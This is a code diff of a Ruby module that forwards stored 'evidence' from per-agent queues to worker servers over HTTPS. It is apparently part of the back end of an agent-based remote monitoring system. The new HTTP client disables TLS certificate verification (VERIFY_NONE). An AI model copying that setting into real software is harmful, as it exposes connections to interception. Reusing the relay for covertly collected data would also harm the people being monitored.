@@ -2,30 +2,41 @@
 #  Evidence Transfer module for transferring evidence to the db
 #
 
-require_relative 'db.rb'
-require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/fixnum'
 require 'rcs-common/symbolize'
+require 'rcs-common/path_utils'
+
+require_release 'rcs-collector/db'
+require_release 'rcs-collector/evidence_manager'
+
 
 # from system
 require 'thread'
 
 module RCS
-module Collector
+module Carrier
 
 class EvidenceTransfer
   include Singleton
   include RCS::Tracer
 
-  def start
+  attr_accessor :status
+
+  def initialize
+    @workers = {}
+    @status = nil
+    @http = {}
     @threads = Hash.new
-    @worker = Thread.new { self.work }
   end
 
-  def work
+  def self.run
+    instance.run
+  end
+
+  def run
     # infinite loop for working
     loop do
       # pass the control to other threads
@@ -53,10 +64,9 @@ class EvidenceTransfer
             # and passing them as they were a session
             sess = info.symbolize
             sess[:demo] = (sess[:demo] == 1) ? true : false
-            sess[:scout] = (sess[:scout] == 1) ? true : false
 
             # ask the database the id of the agent
-            status, agent_id = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:platform], sess[:demo], sess[:scout])
+            status, agent_id = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:platform], sess[:demo], sess[:level])
             sess[:bid] = agent_id
 
             case status
@@ -76,9 +86,12 @@ class EvidenceTransfer
                 end
             end
 
+          rescue PersistentHTTP::Error => e
+            @status = "Cannot reach worker: #{e.message}"
+            trace :error, @status
           rescue Exception => e
-            trace :error, "Error processing evidences: #{e.message}"
-            trace :error, e.backtrace
+            @status = "Error processing evidences: #{e.class} #{e.message}"
+            trace :error, @status
           ensure
             trace :debug, "Job for #{instance} is over (#{@threads.keys.size}/#{Thread.list.count} working threads)"
 
@@ -92,6 +105,10 @@ class EvidenceTransfer
   rescue Exception => e
     trace :error, "Evidence transfer error: #{e.message}"
     retry
+  end
+
+  def threads
+    @threads.size
   end
 
   def get_evidence(instance)
@@ -108,8 +125,9 @@ class EvidenceTransfer
     evidence = EvidenceManager.instance.get_evidence(id, instance)
     raise "evidence to be transferred is nil" if evidence.nil?
 
-    # send and delete the evidence
-    ret, error, action = DB.instance.send_evidence(instance, evidence)
+    address = get_worker_address(instance)
+    raise "invalid worker address" unless address
+    ret, error, action = send_evidence(address, instance, evidence)
 
     if ret
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
@@ -121,7 +139,44 @@ class EvidenceTransfer
       trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
       EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     end
-    
+  end
+
+  def get_worker_address(instance)
+    return @workers[instance] if @workers[instance]
+
+    address = DB.instance.get_worker(instance)
+    trace :info, "Worker address for #{instance} is #{address}"
+
+    @workers[instance] = address
+  end
+
+  def send_evidence(address, instance, evidence)
+
+    host, port = address.split(':')
+
+    http = @http[address] ||= PersistentHTTP.new(
+      :name         => 'PersistentToWorker' + address,
+      :pool_size    => 20,
+      :host         => host,
+      :port         => port,
+      :use_ssl      => true,
+      :verify_mode  => OpenSSL::SSL::VERIFY_NONE
+    )
+
+    request = Net::HTTP::Post.new("/evidence/#{instance}")
+    request.body = evidence
+    ret = http.request(request)
+
+    case ret
+      when Net::HTTPSuccess then return true, "OK", :delete
+      when Net::HTTPConflict then return false, "empty evidence", :delete
+    end
+
+    return false, ret.body
+  rescue Exception => e
+    trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
+    #trace :fatal, e.backtrace
+    raise
   end
 
 end
